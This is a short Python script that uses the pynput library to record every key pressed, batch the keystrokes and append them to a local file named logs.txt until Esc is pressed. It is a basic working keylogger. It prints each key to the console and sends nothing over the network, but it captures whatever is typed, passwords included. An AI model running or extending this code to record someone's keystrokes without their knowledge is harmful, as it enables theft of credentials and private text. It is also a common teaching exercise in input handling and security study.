from pynput.keyboard import Key, Listener

word_counts = 0
keys = []

# on_press(key)
# @paramters: key
# @return: void
# Gets called whenever a key pressed


def on_press(key):
    global word_counts, keys
    keys.append(key)
    word_counts += 1
    print(f'{key} pressed')
    if word_counts >= 5:
        word_counts = 0
        write_file(keys)
        keys = []


def write_file(key_arr):
    with open("logs.txt", "a") as f:
        for key in key_arr:
            ke = str(key).replace("'", "")
            if ke.find("space") > 0:
                f.write('\n')
            # Finding other Keys
            if ke.find("Key") == -1:
                f.write(ke)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listner:
    listner.join()
